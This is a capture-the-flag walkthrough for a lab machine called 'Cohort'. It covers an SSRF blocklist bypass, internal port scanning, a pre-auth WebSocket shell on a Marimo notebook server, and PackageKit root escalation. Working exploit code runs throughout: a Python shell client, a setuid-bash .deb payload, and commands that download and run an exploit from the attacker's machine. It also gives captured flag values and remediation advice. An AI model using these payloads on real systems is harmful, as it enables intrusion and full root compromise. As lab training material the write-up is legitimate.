Phase 1 — Reconnaissance
1.1 Setup
# Set MTU for HTB VPN (prevents packet loss)
sudo ip link set dev tun0 mtu 1300

# Add target to /etc/hosts
echo "10.129.103.0 cohort.htb" | sudo tee -a /etc/hosts

Command	Explanation
ip link set dev tun0 mtu 1300	Reduces Maximum Transmission Unit on the VPN tunnel to avoid fragmentation issues with HTB's infrastructure
echo ... | sudo tee -a /etc/hosts	Appends the target IP→hostname mapping so your system resolves cohort.htb to the correct IP

1.2 Port Scan
nmap -p- --min-rate 2000 -T4 -Pn 10.129.103.0
nmap -p22,80,443 -sCV -Pn 10.129.103.0

Flag	Explanation
-p-	Scan all 65535 ports
--min-rate 2000	Send at least 2000 packets/sec (speeds up scan)
-T4	Aggressive timing template
-Pn	Skip host discovery (HTB blocks ping)
-sCV	Script-based version detection on open ports

Results:

Port	Service	Notes
22	SSH	OpenSSH (no creds known)
80	HTTP	nginx → 301 redirect to HTTPS
443	HTTPS	nginx, TLS cert has SAN *.cohort.htb (wildcard = hidden vhosts exist)

Key observation: The wildcard cert *.cohort.htb hints that other subdomains (like nb-*.cohort.htb) are valid — we'll find one later. 

Phase 2 — Web Enumeration
2.1 Access the Site
curl -sk https://cohort.htb/

Flag	Explanation
-s	Silent mode (no progress bar)
-k	Insecure — skip TLS cert verification (self-signed cert)

The site is a Cohort Analytics SPA (Single Page Application) — a JavaScript frontend that talks to a backend API. 

2.2 Directory Fuzzing
feroxbuster -u https://cohort.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -r --depth 3 -k

Flag	Explanation
-u	Target URL
-w	Wordlist to fuzz
-r	Recursive (follow found paths deeper)
--depth 3	Max recursion depth
-k	Insecure — accept self-signed TLS certs (critical for HTB)

Discovered endpoints:

Endpoint	Purpose
/api/validate	Accepts a URL and fetches it server-side → SSRF
/status	Returns backend/upstream info (403 from external IP, but accessible via SSRF)
/api/health	Health check

Phase 3 — SSRF Discovery & Bypass
3.1 What is SSRF?
Server-Side Request Forgery — the server fetches a URL you specify. If it doesn't properly filter internal addresses, you can make it access localhost services that are not exposed externally.

3.2 The Filter
The /api/validate endpoint blocks obvious loopback addresses like 127.0.0.1, 0.0.0.0, localhost. 

3.3 Bypass — Alternate IP Encodings
curl -sk -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.1/","format":"csv"}'

Why it works: 127.1 is a valid shorthand for 127.0.0.1 in many URL parsers. The blocklist checks for the string 127.0.0.1 but not 127.1. 

Other bypasses that work:

http://[::ffff:7f00:1]/ (IPv6-mapped IPv4)
http://2130706433/ (decimal representation of 127.0.0.1)
Phase 4 — Internal Service Discovery
4.1 Port Scan via SSRF
for port in 5000 8888 8080 3000 9000; do
  curl -sk -X POST https://cohort.htb/api/validate \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"http://127.1:${port}/\",\"format\":\"csv\"}"
done

Results:

Port	Service	Details
5000	Flask API	POST-only, dead end
8888	Marimo 0.20.4	Python notebook server, loopback-only

4.2 Confirm Marimo Version
curl -sk -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.1:8888/api/version","format":"csv"}'

Returns: 0.20.4

4.3 Vhost Discovery via /status
curl -sk -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.1/status","format":"csv"}'

The /status endpoint (normally 403 from outside) is accessible via SSRF and reveals:

upstream: nb-1be3782a8afd3ad5.cohort.htb → 127.0.0.1:8888

This is the nginx vhost that reverse-proxies to the internal Marimo instance. 

4.4 Add Vhost to /etc/hosts
echo "10.129.103.0 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts

Now https://nb-1be3782a8afd3ad5.cohort.htb routes through nginx → internal Marimo on :8888, including WebSocket upgrades.  This is critical because SSRF cannot forge WebSocket connections.

Phase 5 — Foothold: CVE-2026-39987 (Marimo Pre-Auth RCE)
5.1 Vulnerability Explanation
Field	Detail
CVE	CVE-2026-39987
Affected	Marimo < 0.23.0 (target runs 0.20.4)
Type	Missing authentication on WebSocket endpoint
Root Cause	The /terminal/ws WebSocket route never calls validate_auth(), unlike all other endpoints.  Any client that completes the WebSocket handshake gets a live PTY (pseudo-terminal) shell as the marimo user.

In plain terms: Marimo has a terminal feature accessible via WebSocket. The developer forgot to add the auth check on this specific route. Connect to the WebSocket → you get a shell. 

5.2 Exploit
# shell.py — Interactive WebSocket shell
import ssl, sys, threading, websocket

url = "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws"

ws = websocket.create_connection(url, sslopt={"cert_reqs": ssl.CERT_NONE})

def receive():
    while True:
        try:
            data = ws.recv()
            if isinstance(data, bytes):
                data = data.decode(errors="replace")
            sys.stdout.write(data)
            sys.stdout.flush()
        except:
            break

threading.Thread(target=receive, daemon=True).start()
print("[+] Interactive shell ready.")
for line in sys.stdin:
    ws.send(line.rstrip("\n") + "\n")

How it works:

Line	Purpose
websocket.create_connection(url, ...)	Opens TLS + WebSocket connection to /terminal/ws
sslopt={"cert_reqs": ssl.CERT_NONE}	Accepts self-signed cert
threading.Thread(target=receive, ...)	Background thread that prints server output
for line in sys.stdin: ws.send(...)	Sends your keystrokes to the server's PTY

5.3 Run
python3 shell.py

You get: marimo@cohort:~$

5.4 Grab User Flag
cat /home/marimo/user.txt
# 932b104fabb98b341d34e6e7cfabd70d

Phase 6 — Privilege Escalation: CVE-2026-41651 (Pack2TheRoot)
6.1 Vulnerability Explanation
Field	Detail
CVE	CVE-2026-41651
Alias	Pack2TheRoot
Affected	PackageKit 1.0.2 – 1.3.4 (target: 1.2.8)
CVSS	8.8 (High)
Type	TOCTOU Race Condition (CWE-367)
Impact	Unprivileged user → root (arbitrary package install as root)

What is PackageKit? A D-Bus daemon that abstracts package management (apt, dnf, pacman) behind a unified API. GUIs like GNOME Software use it.  It runs as root and requires polkit authentication for privileged operations. 

The 3 bugs in src/pk-transaction.c:

#	Bug	Location	Effect
1	Unconditional flag overwrite	Line 4036	InstallFiles() writes caller-supplied flags to transaction->cached_transaction_flags without checking if the transaction is already authorized/running
2	Silent state-transition rejection	Lines 873–882	pk_transaction_set_state() silently discards backward transitions (e.g. RUNNING → WAITING_FOR_AUTH) but the flag overwrite already happened
3	Late flag read at execution	Lines 2273–2277	The scheduler's idle callback reads cached_transaction_flags at dispatch time, not at authorization time

Exploitation sequence:

┌─────────────────────────────────────────────────────────────────┐
│  1. Call InstallFiles(SIMULATE, dummy.deb)                      │
│     → polkit check is SKIPPED for SIMULATE mode                 │
│     → Transaction state → READY                                 │
│                                                                 │
│  2. IMMEDIATELY call InstallFiles(NONE, payload.deb)            │
│     → Overwrites cached_transaction_flags + file path           │
│     → Race window: before GLib idle handler fires               │
│                                                                 │
│  3. GLib idle handler fires → reads corrupted flags             │
│     → dpkg -i payload.deb runs AS ROOT                          │
│     → postinst script executes with uid=0                       │
└─────────────────────────────────────────────────────────────────┘

6.2 Confirm Vulnerability
dpkg -l | grep packagekit
# packagekit  1.2.8-2ubuntu1.2   ← VULNERABLE (< 1.3.5)

6.3 Build Payload .deb
On your local machine:

mkdir -p /tmp/payload/DEBIAN

# Control file
cat > /tmp/payload/DEBIAN/control <<'EOF'
Package: payload
Version: 1.0
Architecture: amd64
Maintainer: attacker
Description: exploit
EOF

# Post-install script — runs as root during dpkg -i
cat > /tmp/payload/DEBIAN/postinst <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /tmp/payload/DEBIAN/postinst

# Build the .deb
dpkg-deb --build --root-owner-group /tmp/payload /tmp/payload.deb

Component	Purpose
DEBIAN/control	Package metadata (required by dpkg)
DEBIAN/postinst	Script executed after install — here it sets SUID bit on /bin/bash
dpkg-deb --build	Packages files into a valid .deb
--root-owner-group	Sets ownership to root:root (avoids warning)

6.4 Serve & Transfer
# Local machine — serve files
cd /tmp
python3 -m http.server 8000

# Target (marimo shell)
cd /tmp
curl http://10.10.14.27:8000/payload.deb -o payload.deb

6.5 Run the Exploit
Use the Python exploit from 0xBlackash/CVE-2026-41651:

# Local machine
git clone https://github.com/0xBlackash/CVE-2026-41651
cd CVE-2026-41651
python3 -m http.server 8000

# Target
curl http://10.10.14.27:8000/cve-2026-41651.py -o /tmp/exploit.py
python3 /tmp/exploit.py

The exploit:

Creates a dummy .deb (for the SIMULATE call)
Creates the payload .deb (postinst → chmod +s /bin/bash)
Fires both D-Bus InstallFiles calls in rapid succession
The race wins → dpkg -i payload.deb runs as root → SUID bash created 
6.6 Get Root
/bin/bash -p
id
# uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)

cat /root/root.txt
# 9809ac4988b56295c56993ef567410a2

Why -p? The -p flag tells bash to preserve the effective UID. Without it, bash drops to the real UID (1000/marimo) on startup, and you lose root.

Summary of Vulnerabilities
#	CVE / Issue	Component	Type	Impact
1	Incomplete SSRF filter	/api/validate	Blocklist bypass via IP encoding	Internal service access
2	Info disclosure	/status endpoint	IP-based ACL bypassed via SSRF	Internal vhost hostname leaked
3	CVE-2026-39987	Marimo 0.20.4	Missing auth on /terminal/ws	Pre-auth RCE as marimo
4	CVE-2026-41651	PackageKit 1.2.8	TOCTOU race on transaction flags	Local LPE → root

Remediation (for reference)
Issue	Fix
SSRF in /api/validate	Use an allowlist of permitted destinations; resolve and validate the final IP after DNS resolution
/status endpoint	Never expose upstream hostnames; restrict to localhost-only with proper auth
Marimo pre-auth RCE	Upgrade to Marimo ≥ 0.23.0; never expose notebook servers without auth on all endpoints
PackageKit TOCTOU	Upgrade to PackageKit ≥ 1.3.5
General	Principle of least privilege — marimo user should not be able to trigger privileged D-Bus transactions

Flags
Flag	Value
User	932b104fabb98b341d34e6e7cfabd70d
Root	9809ac4988b56295c56993ef567410a2
